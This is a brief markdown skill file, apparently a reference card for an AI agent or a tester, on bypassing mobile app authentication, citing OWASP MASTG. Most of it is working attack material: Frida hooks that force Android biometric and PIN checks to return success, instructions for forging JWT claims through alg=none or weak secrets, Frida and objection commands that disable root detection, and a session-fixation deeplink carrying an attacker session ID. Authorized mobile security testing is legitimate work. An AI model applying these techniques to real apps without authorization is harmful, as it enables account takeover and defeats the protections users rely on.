# SKILL: Mobile Authentication Bypass
## Version: 1.0 | Domain: mobile

---

## TECHNIQUES
### Biometric bypass (Frida)
```javascript
// Hook biometric callback to always return success
Java.perform(function() {
  var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
  BiometricPrompt.onAuthenticationSucceeded.implementation = function(result) {
    console.log('[*] Biometric bypassed');
    this.onAuthenticationSucceeded(result);
  };
});
```

### PIN/passcode bypass
```javascript
// Hook PIN verification to always return true
Java.perform(function() {
  var PinValidator = Java.use('com.target.app.security.PinValidator');
  PinValidator.validatePin.implementation = function(pin) {
    console.log('[*] PIN bypass');
    return true;
  };
});
```

### Token manipulation
- Decode JWT from SharedPreferences/Keychain.
- Modify claims (user_id, role).
- Re-sign if weak secret or alg=none.

### Root/jailbreak detection bypass
```bash
# Frida — bypass common detection libs
frida -U -f com.target.app -l anti-root-detection.js --no-pause

# objection
objection -g com.target.app explore
android root disable
```

### Session fixation via deeplink
`target://login?session_id=ATTACKER_SESSION` → victim's app uses attacker's session.

## REFERENCES
OWASP MASTG — Authentication Testing
